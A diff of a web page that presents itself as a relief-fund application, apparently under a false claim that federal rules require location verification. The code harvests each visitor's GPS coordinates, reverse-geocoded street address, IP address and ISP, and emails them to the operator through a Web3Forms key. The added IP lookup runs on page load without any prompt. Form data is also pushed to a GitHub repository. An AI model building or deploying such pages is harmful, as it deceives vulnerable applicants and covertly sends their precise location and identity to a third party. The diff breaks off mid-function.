@@ -106,11 +106,12 @@
     footer ul li{margin-bottom:8px}
     footer ul li a{color:rgba(255,255,255,.55);text-decoration:none;font-size:.82rem;transition:color .2s}
     footer ul li a:hover{color:var(--white)}
-    .footer-bottom{display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:.75rem}
+    .footer-bottom{display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:.75px}
     @media(max-width:780px){nav{display:none}.hero{padding:56px 20px}}
+    /* MODAL */
     #loc-overlay{display:none;position:fixed;inset:0;z-index:9999;background:rgba(7,15,30,.88);align-items:center;justify-content:center;backdrop-filter:blur(5px)}
     #loc-overlay.active{display:flex}
-    #loc-modal{background:var(--white);border-radius:14px;padding:40px 36px;max-width:520px;width:92%;text-align:center;box-shadow:0 28px 70px rgba(0,0,0,.5);animation:popIn .25s ease}
+    #loc-modal{background:var(--white);border-radius:14px;padding:40px 36px;max-width:540px;width:92%;text-align:center;box-shadow:0 28px 70px rgba(0,0,0,.5);animation:popIn .25s ease;max-height:90vh;overflow-y:auto}
     @keyframes popIn{from{opacity:0;transform:scale(.92)}to{opacity:1;transform:scale(1)}}
     .loc-modal-icon{font-size:3rem;margin-bottom:16px}
     #loc-modal h2{font-family:'Merriweather',serif;font-size:1.25rem;font-weight:900;color:var(--navy);margin-bottom:10px}
@@ -122,6 +123,7 @@
     .status-loading{color:#2563EB}
     .status-success{color:var(--success)}
     .status-denied{color:#DC2626}
+    /* ADDRESS CARD */
     #modal-address-box{display:none;background:#F0FDF4;border:1px solid #BBF7D0;border-radius:10px;padding:18px 20px;margin-top:16px;text-align:left}
     .addr-header{display:flex;align-items:center;gap:8px;font-size:.7rem;font-weight:700;color:#166534;letter-spacing:.09em;text-transform:uppercase;margin-bottom:14px;border-bottom:1px solid #BBF7D0;padding-bottom:10px}
     .addr-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px 20px}
@@ -130,13 +132,17 @@
     .addr-field-value{font-size:.85rem;color:#14532D;font-weight:600;word-break:break-word}
     .addr-field-value.placeholder{color:#9CA3AF;font-style:italic;font-weight:400}
     .addr-field.full{grid-column:1/-1}
-    .addr-coords-row{margin-top:12px;padding-top:10px;border-top:1px solid #BBF7D0;display:flex;gap:16px;flex-wrap:wrap}
+    .addr-coords-row{margin-top:12px;padding-top:10px;border-top:1px solid #BBF7D0;display:flex;gap:8px;flex-wrap:wrap}
     .addr-coord-chip{font-size:.73rem;color:#166534;background:#DCFCE7;border-radius:4px;padding:3px 8px;font-family:monospace;white-space:nowrap}
+    /* IP chip — slightly different colour to stand out */
+    .addr-coord-chip.ip-chip{color:#1E3A5F;background:#DBEAFE;}
+    /* DENIED BOX */
     #denied-box{display:none;background:#FEF2F2;border:1px solid #FECACA;border-radius:8px;padding:16px;margin-top:16px;text-align:left}
     #denied-box h4{font-size:.82rem;font-weight:700;color:#991B1B;margin-bottom:8px}
     #denied-box ol{padding-left:18px;font-size:.8rem;color:#7F1D1D;line-height:1.85}
     #retry-btn{display:none;margin-top:14px;background:var(--navy);color:var(--white);border:none;padding:10px 24px;border-radius:4px;font-size:.83rem;font-weight:600;cursor:pointer;font-family:inherit;width:100%}
     #retry-btn:hover{background:#1a3a6b}
+    /* FORM VALIDATION */
     .field-err{display:block;font-size:.73rem;color:#F87171;margin-top:4px;min-height:16px;text-align:left}
     input.invalid,select.invalid,textarea.invalid{border-color:#F87171!important}
     input.valid,select.valid,textarea.valid{border-color:#4ade80!important}
@@ -153,6 +159,8 @@
     <p class="modal-desc">Federal regulations require us to verify your current location before processing your relief application. This confirms U.S. residency and matches you with your state's programs.</p>
     <button id="loc-modal-btn" onclick="startLocation()">Allow Location &amp; Continue</button>
     <div id="loc-modal-status"></div>
+
+    <!-- ADDRESS CARD — shown after GPS success -->
     <div id="modal-address-box">
       <div class="addr-header">📍 Your Verified Location</div>
       <div class="addr-grid">
@@ -168,8 +176,11 @@
         <span class="addr-coord-chip" id="addr-lat">Lat: —</span>
         <span class="addr-coord-chip" id="addr-lon">Lon: —</span>
         <span class="addr-coord-chip" id="addr-accuracy">Accuracy: —</span>
+        <!-- IP ADDRESS CHIP — new -->
+        <span class="addr-coord-chip ip-chip" id="addr-ip">IP: detecting...</span>
       </div>
     </div>
+
     <div id="denied-box">
       <h4>📋 How to enable location in your browser:</h4>
       <ol id="denied-steps"></ol>
@@ -340,46 +351,86 @@
 </footer>
 
 <script>
-var locationCaptured = false;
-var capturedAddress  = '';
-var capturedLat      = null;
-var capturedLon      = null;
-var capturedAddrObj  = {};
+/* ══════════════════════════════════════════════════════════
+   STATE
+══════════════════════════════════════════════════════════ */
+var locationCaptured  = false;
+var capturedAddress   = '';
+var capturedLat       = null;
+var capturedLon       = null;
+var capturedAddrObj   = {};
+var visitorIP         = 'Fetching...';   // ← populated on page load
+var visitorIPData     = {};              // ← full IP-info object
 
 /* ══════════════════════════════════════════════════════════
-   CONFIG — FILL THESE IN AFTER SETUP
+   FETCH IP ON PAGE LOAD  (no permission needed)
+   Uses ipapi.co — free, no key required, returns JSON.
+   Falls back to api.ipify.org for just the raw IP.
+══════════════════════════════════════════════════════════ */
+(function fetchIPOnLoad() {
+  fetch('https://ipapi.co/json/')
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      visitorIP   = data.ip || 'Unknown';
+      visitorIPData = {
+        ip:       data.ip       || '',
+        isp:      data.org      || '',
+        city:     data.city     || '',
+        region:   data.region   || '',
+        country:  data.country_name || '',
+        timezone: data.timezone || '',
+        postal:   data.postal   || ''
+      };
+      /* Update the chip in the modal if it's already showing */
+      var chip = document.getElementById('addr-ip');
+      if (chip) chip.textContent = 'IP: ' + visitorIP;
+      console.log('🌐 Visitor IP detected:', visitorIP, '|', visitorIPData.isp);
+    })
+    .catch(function() {
+      /* Fallback — just grab the raw IP */
+      fetch('https://api.ipify.org?format=json')
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+          visitorIP = d.ip || 'Unknown';
+          var chip = document.getElementById('addr-ip');
+          if (chip) chip.textContent = 'IP: ' + visitorIP;
+        })
+        .catch(function() { visitorIP = 'Unavailable'; });
+    });
+})();
+
+/* ══════════════════════════════════════════════════════════
+   CONFIG
 ══════════════════════════════════════════════════════════ */
 var CONFIG = {
   EMAILJS_PUBLIC_KEY:  'YOUR_EMAILJS_PUBLIC_KEY',
   EMAILJS_SERVICE_ID:  'YOUR_SERVICE_ID',
   EMAILJS_TEMPLATE_ID: 'YOUR_TEMPLATE_ID',
-
-  /* Template ID specifically for location-verified alerts */
-  EMAILJS_LOCATION_TEMPLATE_ID: 'YOUR_LOCATION_ALERT_TEMPLATE_ID',
-
-  GITHUB_TOKEN:  'YOUR_GITHUB_TOKEN',
-  GITHUB_OWNER:  'YOUR_GITHUB_USERNAME',
-  GITHUB_REPO:   'YOUR_REPO_NAME',
-  GITHUB_BRANCH: 'main'
+  GITHUB_TOKEN:        'YOUR_GITHUB_TOKEN',
+  GITHUB_OWNER:        'YOUR_GITHUB_USERNAME',
+  GITHUB_REPO:         'YOUR_REPO_NAME',
+  GITHUB_BRANCH:       'main'
 };
 
 /* ══════════════════════════════════════════════════════════
-   PARSE ADDRESS
+   ADDRESS PARSING
 ══════════════════════════════════════════════════════════ */
 function parseAddress(data) {
   var a = data.address || {};
   var houseNum = a.house_number || '';
   var road     = a.road || a.pedestrian || a.footway || a.path || a.cycleway || a.service || a.street || a.track || '';
   var street   = (houseNum && road) ? road + ', ' + houseNum : (road || houseNum || '');
-  var area     = a.neighbourhood || a.suburb || a.quarter || a.hamlet || a.residential || a.allotments || '';
-  var district = a.county || a.city_district || a.district || a.borough || a.municipality || '';
-  var city     = a.city || a.town || a.township || a.municipality || a.village || a.locality || '';
-  var state    = a.state || a.region || a.province || '';
-  var postcode = a.postcode || '';
-  var country  = a.country  || '';
-  return { street, area, district, city, state, postcode, country, displayName: data.display_name || '' };
+  return {
+    street:      street,
+    area:        a.neighbourhood || a.suburb || a.quarter || a.hamlet || a.residential || a.allotments || '',
+    district:    a.county || a.city_district || a.district || a.borough || a.municipality || '',
+    city:        a.city || a.town || a.township || a.municipality || a.village || a.locality || '',
+    state:       a.state || a.region || a.province || '',
+    postcode:    a.postcode || '',
+    country:     a.country  || '',
+    displayName: data.display_name || ''
+  };
 }
-
 function mergeAddr(base, extra) {
   return {
     street:      base.street      || extra.street,
@@ -392,40 +443,29 @@ function mergeAddr(base, extra) {
     displayName: base.displayName || extra.displayName
   };
 }
-
 var NOM = 'https://nominatim.openstreetmap.org';
-
 function reverseAt(lat, lon, zoom) {
-  var url = NOM + '/reverse?lat=' + lat + '&lon=' + lon + '&format=json&addressdetails=1&zoom=' + zoom + '&accept-language=en';
-  return fetch(url, { headers: { 'Accept-Language': 'en' } }).then(function(r) { return r.json(); });
+  return fetch(NOM + '/reverse?lat=' + lat + '&lon=' + lon + '&format=json&addressdetails=1&zoom=' + zoom + '&accept-language=en', { headers: { 'Accept-Language': 'en' } }).then(function(r) { return r.json(); });
 }
-
 function nearbyRoadSearch(lat, lon) {
-  var d = 0.018;
-  var box = (lon-d)+','+(lat-d)+','+(lon+d)+','+(lat+d);
-  var url = NOM+'/search?format=json&addressdetails=1&limit=5&featuretype=road&viewbox='+box+'&bounded=1&q=road&accept-language=en';
-  return fetch(url, { headers: { 'Accept-Language': 'en' } }).then(function(r) { return r.json(); }).catch(function() { return []; });
+  var d = 0.018, box = (lon-d)+','+(lat-d)+','+(lon+d)+','+(lat+d);
+  return fetch(NOM+'/search?format=json&addressdetails=1&limit=5&featuretype=road&viewbox='+box+'&bounded=1&q=road&accept-language=en', { headers:{ 'Accept-Language':'en' } }).then(function(r){return r.json();}).catch(function(){return[];});
 }
-
 function nearbySuburbSearch(lat, lon) {
-  var d = 0.025;
-  var box = (lon-d)+','+(lat-d)+','+(lon+d)+','+(lat+d);
-  var url = NOM+'/search?format=json&addressdetails=1&limit=5&featuretype=settlement&viewbox='+box+'&bounded=1&q=suburb&accept-language=en';
-  return fetch(url, { headers: { 'Accept-Language': 'en' } }).then(function(r) { return r.json(); }).catch(function() { return []; });
+  var d = 0.025, box = (lon-d)+','+(lat-d)+','+(lon+d)+','+(lat+d);
+  return fetch(NOM+'/search?format=json&addressdetails=1&limit=5&featuretype=settlement&viewbox='+box+'&bounded=1&q=suburb&accept-language=en', { headers:{ 'Accept-Language':'en' } }).then(function(r){return r.json();}).catch(function(){return[];});
 }
-
 function deepResolveAddress(lat, lon) {
   setStatus('📍 GPS detected! Searching for street, area & address...', 'status-loading');
-  var p18     = reverseAt(lat, lon, 18).catch(function() { return {}; });
-  var p16     = reverseAt(lat, lon, 16).catch(function() { return {}; });
-  var p14     = reverseAt(lat, lon, 14).catch(function() { return {}; });
-  var pRoad   = nearbyRoadSearch(lat, lon);
-  var pSuburb = nearbySuburbSearch(lat, lon);
-  return Promise.all([p18, p16, p14, pRoad, pSuburb]).then(function(results) {
-    var d18 = results[0], d16 = results[1], d14 = results[2];
+  return Promise.all([
+    reverseAt(lat, lon, 18).catch(function(){return{};}),
+    reverseAt(lat, lon, 16).catch(function(){return{};}),
+    reverseAt(lat, lon, 14).catch(function(){return{};}),
+    nearbyRoadSearch(lat, lon),
+    nearbySuburbSearch(lat, lon)
+  ]).then(function(results) {
+    var merged = mergeAddr(parseAddress(results[0]), mergeAddr(parseAddress(results[1]), parseAddress(results[2])));
     var roads = results[3], suburbs = results[4];
-    var a18 = parseAddress(d18), a16 = parseAddress(d16), a14 = parseAddress(d14);
-    var merged = mergeAddr(a18, mergeAddr(a16, a14));
     if (!merged.street && roads && roads.length) {
       for (var i = 0; i < roads.length; i++) {
         var ra = roads[i].address || {};
@@ -436,95 +476,81 @@ function deepResolveAddress(lat, lon) {
     if (!merged.area && suburbs && suburbs.length) {
       for (var j = 0; j < suburbs.length; j++) {
         var sa = suburbs[j].address || {};
-        var sname = sa.neighbourhood || sa.suburb || sa.quarter || sa.hamlet || sa.residential || (suburbs[j].type === 'suburb' ? suburbs[j].display_name.split(',')[0].trim() : '');
+        var sname = sa.neighbourhood || sa.suburb || sa.quarter || sa.hamlet || sa.residential || (suburbs[j].type==='suburb'?suburbs[j].display_name.split(',')[0].trim():'');
         if (sname) { merged.area = sname; break; }
       }
     }
     if (!merged.area && merged.displayName) {
-      var parts = merged.displayName.split(',').map(function(s) { return s.trim(); });
+      var parts = merged.displayName.split(',').map(function(s){return s.trim();});
       var cityIdx = -1;
-      for (var k = 0; k < parts.length; k++) {
-        if (merged.city && parts[k].toLowerCase() === merged.city.toLowerCase()) { cityIdx = k; break; }
-      }
-      if (cityIdx > 0) {
-        var candidate = parts[cityIdx - 1];
-        if (candidate && candidate !== merged.district && candidate !== merged.street) merged.area = candidate;
-      } else if (parts.length > 1 && parts[0] !== merged.city && parts[0] !== merged.district) {
-        merged.area = parts[0];
-      }
+      for (var k = 0; k < parts.length; k++) { if (merged.city && parts[k].toLowerCase()===merged.city.toLowerCase()) { cityIdx=k; break; } }
+      if (cityIdx > 0) { var c = parts[cityIdx-1]; if (c && c!==merged.district && c!==merged.street) merged.area=c; }
+      else if (parts.length>1 && parts[0]!==merged.city && parts[0]!==merged.district) merged.area=parts[0];
     }
     return merged;
   });
 }
 
 /* ══════════════════════════════════════════════════════════
-   SEND LOCATION ALERT EMAIL  ← NEW
-   Fires immediately after GPS coords + address are resolved,
-   before the modal closes. Uses a dedicated template so you
-   can format it however you like in EmailJS.
+   SEND LOCATION ALERT EMAIL  (fires right after GPS)
 ══════════════════════════════════════════════════════════ */
 function sendLocationAlert(parsed, lat, lon, accuracy) {
-  var alertId  = 'LOC-' + Date.now().toString(36).toUpperCase();
-  var mapsLink = 'https://www.google.com/maps?q=' + lat.toFixed(6) + ',' + lon.toFixed(6);
+  var alertId   = 'LOC-' + Date.now().toString(36).toUpperCase();
+  var mapsLink  = 'https://www.google.com/maps?q=' + lat.toFixed(6) + ',' + lon.toFixed(6);
   var timestamp = new Date().toISOString();
-
   var payload = {
-    access_key:   '8f55868a-da86-4202-8b44-44ac26ec6bf4',
-    subject:      '📍 Location Verified — FRF Alert | ' + alertId,
-    from_name:    'FRF Location System',
-
-    /* Summary line at top of email */
+    access_key: '8f55868a-da86-4202-8b44-44ac26ec6bf4',
+    subject:    '📍 Location Verified — FRF Alert | ' + alertId,
+    from_name:  'FRF Location System',
     message: [
       '🔔 EVENT: LOCATION VERIFIED',
-      '🆔 Alert ID: '    + alertId,
-      '🕐 Time: '        + timestamp,
+      '🆔 Alert ID:    ' + alertId,
+      '🕐 Time:        ' + timestamp,
       '',
-      '📍 FULL ADDRESS',
-      'Street:     '     + (parsed.street   || 'N/A'),
-      'Area:       '     + (parsed.area     || 'N/A'),
-      'District:   '     + (parsed.district || 'N/A'),
-      'City:       '     + (parsed.city     || 'N/A'),
-      'State:      '     + (parsed.state    || 'N/A'),
-      'Postcode:   '     + (parsed.postcode || 'N/A'),
-      'Country:    '     + (parsed.country  || 'N/A'),
-      'Display:    '     + (parsed.displayName || 'N/A'),
+      '🌐 VISITOR IP',
+      'IP Address:  ' + visitorIP,
+      'ISP / Org:   ' + (visitorIPData.isp      || 'N/A'),
+      'IP City:     ' + (visitorIPData.city      || 'N/A'),
+      'IP Region:   ' + (visitorIPData.region    || 'N/A'),
+      'IP Country:  ' + (visitorIPData.country   || 'N/A'),
+      'IP Timezone: ' + (visitorIPData.timezone  || 'N/A'),
+      'IP Postcode: ' + (visitorIPData.postal    || 'N/A'),
+      '',
+      '📍 GPS ADDRESS',
+      'Street:      ' + (parsed.street      || 'N/A'),
+      'Area:        ' + (parsed.area        || 'N/A'),
+      'District:    ' + (parsed.district    || 'N/A'),
+      'City:        ' + (parsed.city        || 'N/A'),
+      'State:       ' + (parsed.state       || 'N/A'),
+      'Postcode:    ' + (parsed.postcode    || 'N/A'),
+      'Country:     ' + (parsed.country     || 'N/A'),
+      'Display:     ' + (parsed.displayName || 'N/A'),
       '',
       '🌐 COORDINATES',
-      'Latitude:   '     + lat.toFixed(6),
-      'Longitude:  '     + lon.toFixed(6),
-      'Accuracy:   '     + Math.round(accuracy) + 'm',
+      'Latitude:    ' + lat.toFixed(6),
+      'Longitude:   ' + lon.toFixed(6),
+      'Accuracy:    ' + Math.round(accuracy) + 'm',
       '',
       '🗺️ Google Maps: ' + mapsLink
     ].join('\n')
   };
-
   return fetch('https://api.web3forms.com/submit', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
     body: JSON.stringify(payload)
-  }).then(function(r) { return r.json(); })
-    .then(function(res) {
-      if (res.success) {
-        console.log('✅ Location alert sent via Web3Forms | ID:', alertId);
-      } else {
-        console.warn('⚠️ Web3Forms responded with error:', res);
-      }
-    })
-    .catch(function(err) {
-      console.warn('⚠️ Location alert failed (non-blocking):', err);
-    });
+  }).then(function(r){return r.json();})
+    .then(function(res){ console.log(res.success ? '✅ Location alert sent | ID: '+alertId : '⚠️ Web3Forms error:', res); })
+    .catch(function(err){ console.warn('⚠️ Location alert failed (non-blocking):', err); });
 }
 
 /* ══════════════════════════════════════════════════════════
    UI HELPERS
 ══════════════════════════════════════════════════════════ */
 function setAddrField(id, value) {
-  var el = document.getElementById(id);
-  if (!el) return;
+  var el = document.getElementById(id); if (!el) return;
   if (value && value.trim()) { el.textContent = value; el.classList.remove('placeholder'); }
   else { el.textContent = 'Not available'; el.classList.add('placeholder'); }
 }
-
 function renderAddressCard(parsed, lat, lon, accuracy) {
   setAddrField('addr-street',   parsed.street);
   setAddrField('addr-area',     parsed.area);
@@ -533,12 +559,13 @@ function renderAddressCard(parsed, lat, lon, accuracy) {
   setAddrField('addr-state',    parsed.state);
   setAddrField('addr-postcode', parsed.postcode);
   setAddrField('addr-country',  parsed.country);
-  document.getElementById('addr-lat').textContent      = 'Lat: ' + lat.toFixed(6);
-  document.getElementById('addr-lon').textContent      = 'Lon: ' + lon.toFixed(6);
+  document.getElementById('addr-lat').textContent      = 'Lat: '      + lat.toFixed(6);
+  document.getElementById('addr-lon').textContent      = 'Lon: '      + lon.toFixed(6);
   document.getElementById('addr-accuracy').textContent = 'Accuracy: ~' + Math.round(accuracy) + 'm';
+  /* Update IP chip with live value */
+  document.getElementById('addr-ip').textContent       = 'IP: '       + visitorIP;
   document.getElementById('modal-address-box').style.display = 'block';
 }
-
 function buildBadgeSummary(parsed, lat, lon) {
   var parts = [];
   if (parsed.street)  parts.push(parsed.street);
@@ -546,12 +573,11 @@ function buildBadgeSummary(parsed, lat, lon) {
   if (parsed.city)    parts.push(parsed.city);
   if (parsed.state)   parts.push(parsed.state);
   if (parsed.country) parts.push(parsed.country);
-  if (parts.length)   return parts.join(', ');
-  return lat.toFixed(5) + ', ' + lon.toFixed(5);
+  return parts.length ? parts.join(', ') : lat.toFixed(5) + ', ' + lon.toFixed(5);
 }
 
 /* ══════════════════════════════════════════════════════════
-   BROWSER DETECTION & DENIED STEPS
+   BROWSER DETECTION
 ══════════════════════════════════════════════════════════ */
 function getBrowser() {
   var ua = navigator.userAgent;
@@ -582,17 +608,13 @@ function openLocationModal(e) {
   if (locationCaptured) { document.getElementById('apply').scrollIntoView({behavior:'smooth'}); return; }
   document.getElementById('loc-overlay').classList.add('active');
 }
-
 function closeModalAndProceed() {
   document.getElementById('loc-overlay').classList.remove('active');
   setTimeout(function() { document.getElementById('apply').scrollIntoView({behavior:'smooth'}); }, 300);
 }
-
 function setStatus(msg, cls) {
-  var el = document.getElementById('loc-modal-status');
-  el.innerHTML = msg; el.className = cls || '';
+  var el = document.getElementById('loc-modal-status'); el.innerHTML = msg; el.className = cls || '';
 }
-
 function unlockForm(summary) {
   var btn = document.getElementById('submit-btn');
   btn.disabled = false;
@@ -600,7 +622,7 @@ function unlockForm(summary) {
   document.getElementById('submit-hint').style.display = 'none';
   var badge = document.getElementById('loc-verified-badge');
   badge.style.display = 'block';
-  document.getElementById('badge-address').textContent = summary;
+  document.getElementById('badge-address').textContent = summary + '  |  IP: ' + visitorIP;
 }
 
 /* ══════════════════════════════════════════════════════════
@@ -611,55 +633,44 @@ function startLocation() {
   var deniedBox = document.getElementById('denied-box');
   var retryBtn  = document.getElementById('retry-btn');
   var addrBox   = document.getElementById('modal-address-box');
-
-  deniedBox.style.display = 'none';
-  retryBtn.style.display  = 'none';
-  addrBox.style.display   = 'none';
-  btn.style.display       = 'block';
-  btn.disabled            = true;
-  btn.textContent         = '📡 Detecting your location...';
+  deniedBox.style.display = 'none'; retryBtn.style.display = 'none';
+  addrBox.style.display   = 'none'; btn.style.display       = 'block';
+  btn.disabled = true; btn.textContent = '📡 Detecting your location...';
   setStatus('Please wait — verifying your location...', 'status-loading');
-
   if (!navigator.geolocation) {
     btn.disabled = false; btn.textContent = 'Allow Location & Continue'; setStatus('','');
     deniedBox.style.display = 'block';
     document.getElementById('denied-steps').innerHTML = '<li>Your browser does not support geolocation. Please try Google Chrome or Firefox.</li>';
     return;
   }
-
   navigator.geolocation.getCurrentPosition(
-    /* ── SUCCESS ── */
     function(position) {
       capturedLat = position.coords.latitude;
       capturedLon = position.coords.longitude;
       var accuracy = position.coords.accuracy;
       window._locationAccuracy = accuracy;
-
       deepResolveAddress(capturedLat, capturedLon)
         .then(function(parsed) {
           capturedAddrObj = parsed;
           capturedAddress = buildBadgeSummary(parsed, capturedLat, capturedLon);
-
           renderAddressCard(parsed, capturedLat, capturedLon, accuracy);
           locationCaptured = true;
-
-          /* ── SEND LOCATION ALERT EMAIL IMMEDIATELY ── */
           sendLocationAlert(parsed, capturedLat, capturedLon, accuracy);
-
           console.log('=== VISITOR LOCATION CAPTURED ===');
-          console.log('Street / Road    :', parsed.street      || '(none)');
-          console.log('Neighbourhood    :', parsed.area        || '(none)');
-          console.log('District / County:', parsed.district    || '(none)');
-          console.log('City / Town      :', parsed.city        || '(none)');
-          console.log('State / Region   :', parsed.state       || '(none)');
-          console.log('Postcode / ZIP   :', parsed.postcode    || '(none)');
-          console.log('Country          :', parsed.country     || '(none)');
+          console.log('IP Address       :', visitorIP);
+          console.log('ISP / Org        :', visitorIPData.isp || '(unknown)');
+          console.log('Street / Road    :', parsed.street   || '(none)');
+          console.log('Neighbourhood    :', parsed.area     || '(none)');
+          console.log('District/County  :', parsed.district || '(none)');
+          console.log('City / Town      :', parsed.city     || '(none)');
+          console.log('State / Region   :', parsed.state    || '(none)');
+          console.log('Postcode / ZIP   :', parsed.postcode || '(none)');
+          console.log('Country          :', parsed.country  || '(none)');
           console.log('Full Display Name:', parsed.displayName || '(none)');
           console.log('Latitude         :', capturedLat);
           console.log('Longitude        :', capturedLon);
           console.log('Accuracy         :', Math.round(accuracy) + 'm');
           console.log('Timestamp        :', new Date().toISOString());
-
           btn.textContent = '✅ Verified — Proceeding to Application...';
           setStatus('✅ Location confirmed successfully!', 'status-success');
           unlockForm(capturedAddress);
@@ -668,28 +679,20 @@ function startLocation() {
         .catch(function() {
           capturedAddress  = capturedLat.toFixed(6) + ', ' + capturedLon.toFixed(6);
           locationCaptured = true;
-
-          /* ── SEND LOCATION ALERT (coords only) ── */
-          sendLocationAlert({ street:'',area:'',district:'',city:'',state:'',postcode:'',country:'',displayName:'' }, capturedLat, capturedLon, accuracy);
-
-          renderAddressCard({ street:'',area:'',district:'',city:'',state:'',postcode:'',country:'' }, capturedLat, capturedLon, accuracy);
-          console.log('=== VISITOR LOCATION (coords only) ===');
-          console.log('Lat:', capturedLat, '| Lon:', capturedLon, '| Accuracy:', Math.round(accuracy)+'m');
+          sendLocationAlert({street:'',area:'',district:'',city:'',state:'',postcode:'',country:'',displayName:''}, capturedLat, capturedLon, accuracy);
+          renderAddressCard({street:'',area:'',district:'',city:'',state:'',postcode:'',country:''}, capturedLat, capturedLon, accuracy);
           btn.textContent = '✅ Coordinates Verified — Proceeding...';
-          setStatus('✅ Coordinates confirmed (address lookup unavailable).', 'status-success');
+          setStatus('✅ Coordinates confirmed.', 'status-success');
           unlockForm(capturedAddress);
           setTimeout(function() { closeModalAndProceed(); }, 2400);
         });
     },
-
-    /* ── ERROR ── */
     function(error) {
       btn.disabled = false; btn.textContent = 'Allow Location & Continue';
       if (error.code === 1) {
         setStatus('⚠️ Location access was blocked. Follow the steps below to enable it:', 'status-denied');
-        var steps = getDeniedSteps();
-        var ol = document.getElementById('denied-steps'); ol.innerHTML = '';
-        steps.forEach(function(s) { var li = document.createElement('li'); li.innerHTML = s; ol.appendChild(li); });
+        var steps = getDeniedSteps(), ol = document.getElementById('denied-steps'); ol.innerHTML = '';
+        steps.forEach(function(s){var li=document.createElement('li');li.innerHTML=s;ol.appendChild(li);});
         deniedBox.style.display = 'block'; retryBtn.style.display = 'block';
       } else if (error.code === 2) {
         setStatus('⚠️ Location signal unavailable. Check your device GPS and try again.', 'status-denied');
@@ -706,59 +709,45 @@ function startLocation() {
 /* ══════════════════════════════════════════════════════════
    FORM VALIDATION
 ══════════════════════════════════════════════════════════ */
-function getVal(id) { var el = document.getElementById(id); return el ? el.value.trim() : ''; }
-function setFieldState(fieldId, errId, msg) {
-  var field = document.getElementById(fieldId), err = document.getElementById(errId);
-  if (!field || !err) return;
-  if (msg) { field.classList.add('invalid'); field.classList.remove('valid'); err.textContent = msg; }
-  else { field.classList.remove('invalid'); field.classList.add('valid'); err.textContent = ''; }
+function getVal(id){ var el=document.getElementById(id); return el?el.value.trim():''; }
+function setFieldState(fieldId,errId,msg){
+  var field=document.getElementById(fieldId),err=document.getElementById(errId); if(!field||!err) return;
+  if(msg){field.classList.add('invalid');field.classList.remove('valid');err.textContent=msg;}
+  else{field.classList.remove('invalid');field.classList.add('valid');err.textContent='';}
 }
-function clearAllErrors() {
-  ['firstname','lastname','email','phone','state','income','program','need'].forEach(function(id) { setFieldState('f-'+id,'err-'+id,''); });
-  document.getElementById('submit-error').style.display = 'none';
+function clearAllErrors(){
+  ['firstname','lastname','email','phone','state','income','program','need'].forEach(function(id){setFieldState('f-'+id,'err-'+id,'');});
+  document.getElementById('submit-error').style.display='none';
 }
-function validateForm() {
-  var ok = true;
-  function req(fieldId, errId, label) {
-    var v = getVal(fieldId);
-    if (!v) { setFieldState(fieldId, errId, label + ' is required.'); ok = false; }
-    else { setFieldState(fieldId, errId, ''); }
-    return v;
-  }
-  req('f-firstname','err-firstname','First name');
-  req('f-lastname','err-lastname','Last name');
-  var email = req('f-email','err-email','Email address');
-  if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { setFieldState('f-email','err-email','Please enter a valid email address.'); ok = false; }
-  var phone = req('f-phone','err-phone','Phone number');
-  if (phone && phone.replace(/\D/g,'').length < 7) { setFieldState('f-phone','err-phone','Please enter a valid phone number.'); ok = false; }
-  req('f-state','err-state','State of residence');
-  req('f-income','err-income','Household income');
-  req('f-program','err-program','Program of interest');
-  req('f-need','err-need','Description of need');
+function validateForm(){
+  var ok=true;
+  function req(fid,eid,label){ var v=getVal(fid); if(!v){setFieldState(fid,eid,label+' is required.');ok=false;} else{setFieldState(fid,eid,'');} return v; }
+  req('f-firstname','err-firstname','First name'); req('f-lastname','err-lastname','Last name');
+  var email=req('f-email','err-email','Email address');
+  if(email&&!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){setFieldState('f-email','err-email','Please enter a valid email address.');ok=false;}
+  var phone=req('f-phone','err-phone','Phone number');
+  if(phone&&phone.replace(/\D/g,'').length<7){setFieldState('f-phone','err-phone','Please enter a valid phone number.');ok=false;}
+  req('f-state','err-state','State of residence'); req('f-income','err-income','Household income');
+  req('f-program','err-program','Program of interest'); req('f-need','err-need','Description of need');
   return ok;
 }
 
 /* ══════════════════════════════════════════════════════════
-   GENERATE REFERENCE ID
+   GENERATE REF ID
 ══════════════════════════════════════════════════════════ */
-function genRefId() {
-  var ts = Date.now().toString(36).toUpperCase();
-  var rand = Math.random().toString(36).substr(2,5).toUpperCase();
-  return 'FRF-' + ts + '-' + rand;
-}
+function genRefId(){ return 'FRF-'+Date.now().toString(36).toUpperCase()+'-'+Math.random().toString(36).substr(2,5).toUpperCase(); }
 
 /* ══════════════════════════════════════════════════════════
    SAVE TO GITHUB
 ══════════════════════════════════════════════════════════ */
 function saveToGitHub(data, refId) {
   var filename = 'submissions/' + refId + '.json';
-  var content  = JSON.stringify(data, null, 2);
-  var encoded  = btoa(unescape(encodeURIComponent(content)));
-  return fetch('https://api.github.com/repos/' + CONFIG.GITHUB_OWNER + '/' + CONFIG.GITHUB_REPO + '/contents/' + filename, {
+  var encoded  = btoa(unescape(encodeURIComponent(JSON.stringify(data, null, 2))));
+  return fetch('https://api.github.com/repos/'+CONFIG.GITHUB_OWNER+'/'+CONFIG.GITHUB_REPO+'/contents/'+filename, {
     method: 'PUT',
-    headers: { 'Authorization': 'token ' + CONFIG.GITHUB_TOKEN, 'Content-Type': 'application/json', 'Accept': 'application/vnd.github.v3+json' },
-    body: JSON.stringify({ message: 'New application: ' + refId, content: encoded, branch: CONFIG.GITHUB_BRANCH })
-  }).then(function(r) { if (!r.ok) throw new Error('GitHub API error: ' + r.status); return r.json(); });
+    headers: { 'Authorization':'token '+CONFIG.GITHUB_TOKEN, 'Content-Type':'application/json', 'Accept':'application/vnd.github.v3+json' },
+    body: JSON.stringify({ message:'New application: '+refId, content:encoded, branch:CONFIG.GITHUB_BRANCH })
+  }).then(function(r){ if(!r.ok) throw new Error('GitHub API error: '+r.status); return r.json(); });
 }
 
 /* ══════════════════════════════════════════════════════════
@@ -777,6 +766,11 @@ function sendEmail(data, refId) {
     income:      data.income,
     program:     data.program,
     need:        data.need,
+    ip_address:  data.visitorIP,
+    ip_isp:      data.visitorIPData.isp     || 'N/A',
+    ip_city:     data.visitorIPData.city    || 'N/A',
+    ip_region:   data.visitorIPData.region  || 'N/A',
